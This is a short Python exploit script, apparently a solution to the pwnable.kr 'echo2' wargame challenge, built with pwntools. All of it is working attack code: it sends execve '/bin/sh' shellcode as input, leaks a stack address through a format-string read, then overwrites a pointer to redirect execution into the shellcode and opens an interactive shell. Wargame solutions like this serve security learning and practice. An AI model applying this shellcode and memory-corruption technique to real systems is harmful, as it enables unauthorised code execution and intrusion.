from pwn import *
import sys


def main():
    context.arch = 'amd64'
    context.os = 'linux'

    if(sys.argv[1] == "remote"):
        print("Attacking Server!")
        p = remote("pwnable.kr",9011)
    else:
        print("Running Locally")
        p = process("./echo2")
        
    # Inputs setup
    name = b'\x31\xF6\x56\x48\xBB\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x53\x54\x5F\xF7\xEE\xB0\x3B\x0F\x05'

    p.sendline(name)
    print("injected shellcode: ")
    print(enhex(name))
    p.sendline(b"2");
    p.sendline(b"%10$x");

    p.recvuntil(b">")
    p.recvline()
    RBP_string = p.recvline()[:-1]
    print("Found RBP: ",RBP_string);
    RBP = int.from_bytes(RBP_string, byteorder='little') - 0x20;

    # gdb.attach(p, 
    #            """
    #            x/4i $rbp+0x20
    #            break *0x4009b5 
    #            """)
    target_addr = p64(RBP) # address of the name buffer
    payload = b"A" *24 + target_addr

    p.sendline(b"4")
    p.sendline(b"n")
    p.sendline(b"3")
    p.sendline(payload)
    p.interactive()

if __name__=="__main__":
    main()
